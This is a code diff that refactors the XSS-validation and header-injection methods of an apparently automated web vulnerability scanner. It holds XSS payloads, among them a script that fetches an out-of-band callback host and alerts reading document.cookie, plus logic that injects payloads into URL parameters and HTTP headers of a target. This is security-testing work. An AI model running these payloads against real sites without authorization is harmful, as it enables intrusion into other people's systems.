@@ -2096,59 +2096,106 @@ Response Format (XML-Like):
     ) -> tuple:
         """
         Hunter Validation: Optimized for speed and safety.
-        
+
         1. Interactsh (OOB) - CONFIRMED (Fastest)
         2. Playwright (Browser) - CONFIRMED (Safe Concurrency)
         3. Reflection Check - PENDING_CDP_VALIDATION for Manager (Exclusive CDP)
         """
         evidence = {"payload": payload}
 
-        # 1. Interactsh (Definitive OOB) - No browser needed
-        if self.interactsh:
-            await asyncio.sleep(1) 
-            label = f"xss_{param}".replace("-", "").replace("_", "")[:20]
-            hit_data = await self.interactsh.check_hit(label)
-            if hit_data:
-                evidence["interactsh_hit"] = True
-                evidence["interactions"] = [hit_data]
-                dashboard.log(f"[{self.name}] 🚨 OOB INTERACTION DETECTED!", "CRITICAL")
-                return True, evidence
+        # 1. Check Interactsh OOB
+        if await self._check_interactsh_hit(param, evidence):
+            return True, evidence
 
-        # 2. Playwright Validation (Multi-threaded Safe)
-        # We skip CDP entirely here (prefer_cdp=False in constructor)
-        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-        parsed = urlparse(self.url)
-        params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
-        params[param] = payload
-        attack_url = urlunparse((
-            parsed.scheme, parsed.netloc, parsed.path,
-            parsed.params, urlencode(params), parsed.fragment
-        ))
+        # 2. Check Playwright browser validation
+        attack_url = self._build_attack_url(param, payload)
+        result = await self._run_playwright_validation(attack_url, screenshots_dir)
 
-        dashboard.log(f"[{self.name}] 🌐 Browser Validation (Playwright)...", "INFO")
-        result = await self.verifier.verify_xss(
-            url=attack_url,
-            screenshot_dir=str(screenshots_dir),
-            timeout=8.0 
-        )
-        
         if result.success:
             evidence.update(result.details)
             evidence["playwright_confirmed"] = True
             evidence["screenshot_path"] = result.screenshot_path
             evidence["method"] = result.method
-            
-            # ✅ NEW: Call Vision AI if we have screenshot
+
+            # Vision AI validation if screenshot available
             if result.screenshot_path:
-                dashboard.log(f"[{self.name}] 📸 Calling Vision AI for impact validation...", "INFO")
-                
-                try:
-                    # Import Vision client
-                    from bugtrace.core.llm_client import get_vision_model
-                    vision_client = get_vision_model()
-                    
-                    # Prepare prompt with IMPACT FOCUS
-                    vision_prompt = f"""Analyze this screenshot for XSS execution WITH REAL IMPACT.
+                vision_success = await self._run_vision_validation(
+                    result.screenshot_path, attack_url, payload, evidence
+                )
+                if vision_success is not None:
+                    return vision_success, evidence
+
+            dashboard.log(f"[{self.name}] 👁️ Confirmed via Playwright", "SUCCESS")
+            return True, evidence
+
+        # 3. Check reflection
+        if self._check_reflection(payload, response_html, evidence):
+            return True, evidence
+
+        return False, evidence
+
+    async def _check_interactsh_hit(self, param: str, evidence: Dict) -> bool:
+        """Check for Interactsh OOB callback."""
+        if not self.interactsh:
+            return False
+
+        await asyncio.sleep(1)
+        label = f"xss_{param}".replace("-", "").replace("_", "")[:20]
+        hit_data = await self.interactsh.check_hit(label)
+
+        if hit_data:
+            evidence["interactsh_hit"] = True
+            evidence["interactions"] = [hit_data]
+            dashboard.log(f"[{self.name}] 🚨 OOB INTERACTION DETECTED!", "CRITICAL")
+            return True
+
+        return False
+
+    def _build_attack_url(self, param: str, payload: str) -> str:
+        """Build attack URL with payload injected."""
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+        parsed = urlparse(self.url)
+        params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
+        params[param] = payload
+
+        return urlunparse((
+            parsed.scheme, parsed.netloc, parsed.path,
+            parsed.params, urlencode(params), parsed.fragment
+        ))
+
+    async def _run_playwright_validation(self, attack_url: str, screenshots_dir: Path):
+        """Run Playwright browser validation."""
+        dashboard.log(f"[{self.name}] 🌐 Browser Validation (Playwright)...", "INFO")
+        return await self.verifier.verify_xss(
+            url=attack_url,
+            screenshot_dir=str(screenshots_dir),
+            timeout=8.0
+        )
+
+    async def _run_vision_validation(
+        self, screenshot_path: str, attack_url: str, payload: str, evidence: Dict
+    ) -> Optional[bool]:
+        """Run Vision AI validation and return success status or None."""
+        dashboard.log(f"[{self.name}] 📸 Calling Vision AI for impact validation...", "INFO")
+
+        try:
+            from bugtrace.core.llm_client import get_vision_model
+            vision_client = get_vision_model()
+
+            vision_prompt = self._build_vision_prompt(attack_url, payload)
+            vision_result = await self._call_vision_with_retry(vision_client, screenshot_path, vision_prompt)
+
+            return self._process_vision_result(vision_result, evidence)
+
+        except Exception as e:
+            logger.error(f"[{self.name}] Vision AI validation failed: {e}", exc_info=True)
+            evidence["vision_error"] = str(e)
+            return None
+
+    def _build_vision_prompt(self, attack_url: str, payload: str) -> str:
+        """Build vision AI prompt for XSS validation."""
+        return f"""Analyze this screenshot for XSS execution WITH REAL IMPACT.
 
 URL: {attack_url}
 Payload: {payload}
@@ -2188,111 +2235,93 @@ Return JSON:
     "sandbox_detected": true/false
 }}
 """
-                    
-                    # TASK-53: Retry logic with exponential backoff
-                    vision_result = None
-                    max_retries = 3
-                    for attempt in range(max_retries):
-                        try:
-                            vision_result = await vision_client.analyze_image(
-                                image_path=result.screenshot_path,
-                                prompt=vision_prompt
-                            )
-                            break  # Success, exit retry loop
-                        except Exception as retry_error:
-                            if attempt == max_retries - 1:
-                                raise  # Re-raise on final attempt
-                            logger.warning(f"Vision validation attempt {attempt + 1}/{max_retries} failed: {retry_error}")
-                            await asyncio.sleep(2 ** attempt)  # Exponential backoff: 1s, 2s, 4s
 
-                    if vision_result is None:
-                        raise Exception("Vision validation failed after all retries")
-                    
-                    # Parse response
-                    impact_tier = vision_result.get("impact_tier", "LOW")
-                    confidence = vision_result.get("confidence", 0)
-                    sandbox_detected = vision_result.get("sandbox_detected", False)
-                    
-                    # Only confirm Tier 1 (CRITICAL) and Tier 2 (HIGH) with high confidence
-                    if (impact_tier in ["CRITICAL", "HIGH"] and 
-                        confidence > 0.7 and 
-                        not sandbox_detected):
-                        
-                        # ✅ Vision confirmed HIGH IMPACT → VALIDATED_CONFIRMED
-                        evidence["vision_confirmed"] = True
-                        evidence["vision_confidence"] = confidence
-                        evidence["vision_evidence"] = vision_result.get("evidence")
-                        evidence["impact_tier"] = impact_tier
-                        evidence["impact_type"] = vision_result.get("impact_type")
-                        
-                        dashboard.log(
-                            f"[{self.name}] ✅ VALIDATED via Vision AI "
-                            f"({impact_tier} impact, conf={confidence:.2f})", 
-                            "SUCCESS"
-                        )
-                        return True, evidence
-                        
-                    elif impact_tier == "MEDIUM":
-                        # ⚠️ Likely sandboxed alert(1) - REJECT
-                        evidence["vision_confirmed"] = False
-                        evidence["vision_reason"] = "Low impact (likely sandboxed alert)"
-                        evidence["impact_tier"] = "MEDIUM"
-                        evidence["rejected_reason"] = "No demonstrable impact (alert without data access)"
-                        
-                        dashboard.log(
-                            f"[{self.name}] ❌ REJECTED: Low impact XSS (alert only, no data exfiltration)", 
-                            "WARNING"
-                        )
-                        
-                        # DO NOT send to AgenticValidator - just reject
-                        return False, evidence
-                        
-                    else:
-                        # ❌ Vision inconclusive or LOW tier → send to AgenticValidator for review
-                        evidence["vision_confirmed"] = False
-                        evidence["vision_reason"] = vision_result.get("reason", "Low confidence or tier")
-                        evidence["impact_tier"] = impact_tier
-                        
-                        dashboard.log(
-                            f"[{self.name}] ⚠️ Vision inconclusive ({impact_tier}), flagging for AgenticValidator", 
-                            "WARNING"
-                        )
-                except Exception as e:
-                    logger.error(f"[{self.name}] Vision AI validation failed: {e}", exc_info=True)
-                    evidence["vision_error"] = str(e)
-            
-            dashboard.log(f"[{self.name}] 👁️ Confirmed via Playwright", "SUCCESS")
-            return True, evidence
+    async def _call_vision_with_retry(self, vision_client, screenshot_path: str, prompt: str) -> Dict:
+        """Call vision API with retry logic."""
+        max_retries = 3
+        for attempt in range(max_retries):
+            try:
+                result = await vision_client.analyze_image(
+                    image_path=screenshot_path,
+                    prompt=prompt
+                )
+                return result
+            except Exception as retry_error:
+                if attempt == max_retries - 1:
+                    raise
+                logger.warning(f"Vision validation attempt {attempt + 1}/{max_retries} failed: {retry_error}")
+                await asyncio.sleep(2 ** attempt)  # Exponential backoff
 
-        # 3. Smart Reflection Check (Queuing for Manager Audit)
-        # We check for the payload literal, but also its decoded variants
-        # (Handling Double Encoding and server-side normalization)
+        raise Exception("Vision validation failed after all retries")
+
+    def _process_vision_result(self, vision_result: Dict, evidence: Dict) -> Optional[bool]:
+        """Process vision AI result and update evidence."""
+        impact_tier = vision_result.get("impact_tier", "LOW")
+        confidence = vision_result.get("confidence", 0)
+        sandbox_detected = vision_result.get("sandbox_detected", False)
+
+        # High impact confirmed
+        if impact_tier in ["CRITICAL", "HIGH"] and confidence > 0.7 and not sandbox_detected:
+            evidence["vision_confirmed"] = True
+            evidence["vision_confidence"] = confidence
+            evidence["vision_evidence"] = vision_result.get("evidence")
+            evidence["impact_tier"] = impact_tier
+            evidence["impact_type"] = vision_result.get("impact_type")
+
+            dashboard.log(
+                f"[{self.name}] ✅ VALIDATED via Vision AI ({impact_tier} impact, conf={confidence:.2f})",
+                "SUCCESS"
+            )
+            return True
+
+        # Low impact - reject
+        if impact_tier == "MEDIUM":
+            evidence["vision_confirmed"] = False
+            evidence["vision_reason"] = "Low impact (likely sandboxed alert)"
+            evidence["impact_tier"] = "MEDIUM"
+            evidence["rejected_reason"] = "No demonstrable impact (alert without data access)"
+
+            dashboard.log(
+                f"[{self.name}] ❌ REJECTED: Low impact XSS (alert only, no data exfiltration)",
+                "WARNING"
+            )
+            return False
+
+        # Inconclusive - send to validator
+        evidence["vision_confirmed"] = False
+        evidence["vision_reason"] = vision_result.get("reason", "Low confidence or tier")
+        evidence["impact_tier"] = impact_tier
+
+        dashboard.log(
+            f"[{self.name}] ⚠️ Vision inconclusive ({impact_tier}), flagging for AgenticValidator",
+            "WARNING"
+        )
+        return None
+
+    def _check_reflection(self, payload: str, response_html: str, evidence: Dict) -> bool:
+        """Check if payload is reflected in response."""
         import urllib.parse
         import html
-        
+
         # Test multiple decoding levels
         p_decoded = urllib.parse.unquote(payload)
         p_double_decoded = urllib.parse.unquote(p_decoded)
         p_html_decoded = html.unescape(p_decoded)
-        
+
         reflections = [payload, p_decoded, p_double_decoded, p_html_decoded]
-        
-        # Identify if any 'dangerous' part of the payload survived in decoded form
-        # especially if we sent it encoded.
-        survived = False
+
+        # Check if any variant is reflected
         for ref in set(reflections):
             if ref and ref in response_html:
-                # Basic proof of reflection
-                survived = True
-                break
-        
-        if survived:
-             evidence["reflected"] = True
-             evidence["status"] = "PENDING_CDP_VALIDATION"
-             dashboard.log(f"[{self.name}] 🔍 Reflection detected (possibly decoded). Delegating to Auditor CDP Audit.", "INFO")
-             return True, evidence
+                evidence["reflected"] = True
+                evidence["status"] = "PENDING_CDP_VALIDATION"
+                dashboard.log(
+                    f"[{self.name}] 🔍 Reflection detected (possibly decoded). Delegating to Auditor CDP Audit.",
+                    "INFO"
+                )
+                return True
 
-        return False, evidence
+        return False
     
     async def _test_fragment_xss(
         self,
@@ -2549,69 +2578,111 @@ Return JSON:
         """Test HTTP headers for XSS reflection."""
         dashboard.log(f"[{self.name}] 🔧 Testing header injection vectors...", "INFO")
 
-        # Simple payload for header injection
-        test_payloads = [
-            f"<script>fetch('{interactsh_url}')</script>",
-            "<img src=x onerror=alert(document.domain)>",
-            "javascript:alert(document.cookie)",
-        ]
+        test_payloads = self._get_header_test_payloads(interactsh_url)
 
         for header_name in self.INJECTABLE_HEADERS:
             if self._max_impact_achieved:
                 break
 
-            for payload in test_payloads:
-                try:
-                    headers = {
-                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                        header_name: payload
-                    }
-
-                    async with aiohttp.ClientSession() as session:
-                        async with session.get(
-                            self.url,
-                            headers=headers,
-                            timeout=aiohttp.ClientTimeout(total=10)
-                        ) as resp:
-                            response_html = await resp.text()
-
-                    # Check if header value is reflected
-                    if payload in response_html or payload[:20] in response_html:
-                        dashboard.log(f"[{self.name}] 🎯 Header '{header_name}' reflects payload!", "SUCCESS")
-
-                        # This is a significant finding - header injection
-                        evidence = {
-                            "vector": "header",
-                            "header_name": header_name,
-                            "payload": payload,
-                            "reflected": True
-                        }
-
-                        # Check for OOB callback
-                        if self.interactsh:
-                            await asyncio.sleep(1)
-                            hit = await self.interactsh.check_hit("header_xss")
-                            if hit:
-                                evidence["interactsh_hit"] = True
-
-                                return XSSFinding(
-                                    url=self.url,
-                                    parameter=f"HEADER:{header_name}",
-                                    payload=payload,
-                                    context=f"Header injection via {header_name}",
-                                    validation_method="header_injection",
-                                    evidence=evidence,
-                                    confidence=0.95,
-                                    status="VALIDATED_CONFIRMED",
-                                    validated=True,
-                                    reflection_context="http_header"
-                                )
-
-                except Exception as e:
-                    logger.debug(f"Header test failed for {header_name}: {e}")
-                    continue
+            finding = await self._test_single_header(header_name, test_payloads)
+            if finding:
+                return finding
 
         return None
+
+    def _get_header_test_payloads(self, interactsh_url: str) -> List[str]:
+        """Get test payloads for header injection."""
+        return [
+            f"<script>fetch('{interactsh_url}')</script>",
+            "<img src=x onerror=alert(document.domain)>",
+            "javascript:alert(document.cookie)",
+        ]
+
+    async def _test_single_header(self, header_name: str, payloads: List[str]) -> Optional[XSSFinding]:
+        """Test a single header with all payloads."""
+        for payload in payloads:
+            finding = await self._test_header_with_payload(header_name, payload)
+            if finding:
+                return finding
+        return None
+
+    async def _test_header_with_payload(self, header_name: str, payload: str) -> Optional[XSSFinding]:
+        """Test a single header with a specific payload."""
+        try:
+            response_html = await self._send_header_request(header_name, payload)
+
+            # Check if header value is reflected
+            if not self._is_header_reflected(payload, response_html):
+                return None
+
+            dashboard.log(f"[{self.name}] 🎯 Header '{header_name}' reflects payload!", "SUCCESS")
+
+            # Create evidence and check for OOB
+            evidence = self._create_header_evidence(header_name, payload)
+            if await self._check_header_oob_hit(evidence):
+                return self._create_header_finding(header_name, payload, evidence)
+
+        except Exception as e:
+            logger.debug(f"Header test failed for {header_name}: {e}")
+
+        return None
+
+    async def _send_header_request(self, header_name: str, payload: str) -> str:
+        """Send HTTP request with payload in header."""
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            header_name: payload
+        }
+
+        async with aiohttp.ClientSession() as session:
+            async with session.get(
+                self.url,
+                headers=headers,
+                timeout=aiohttp.ClientTimeout(total=10)
+            ) as resp:
+                return await resp.text()
+
+    def _is_header_reflected(self, payload: str, response_html: str) -> bool:
+        """Check if header payload is reflected in response."""
+        return payload in response_html or payload[:20] in response_html
+
+    def _create_header_evidence(self, header_name: str, payload: str) -> Dict:
+        """Create evidence dictionary for header injection."""
+        return {
+            "vector": "header",
+            "header_name": header_name,
+            "payload": payload,
+            "reflected": True
+        }
+
+    async def _check_header_oob_hit(self, evidence: Dict) -> bool:
+        """Check for OOB callback from header injection."""
+        if not self.interactsh:
+            return False
+
+        await asyncio.sleep(1)
+        hit = await self.interactsh.check_hit("header_xss")
+
+        if hit:
+            evidence["interactsh_hit"] = True
+            return True
+
+        return False
+
+    def _create_header_finding(self, header_name: str, payload: str, evidence: Dict) -> XSSFinding:
+        """Create XSSFinding for confirmed header injection."""
+        return XSSFinding(
+            url=self.url,
+            parameter=f"HEADER:{header_name}",
+            payload=payload,
+            context=f"Header injection via {header_name}",
+            validation_method="header_injection",
+            evidence=evidence,
+            confidence=0.95,
+            status="VALIDATED_CONFIRMED",
+            validated=True,
+            reflection_context="http_header"
+        )
 
     async def _discover_and_test_post_forms(
         self,
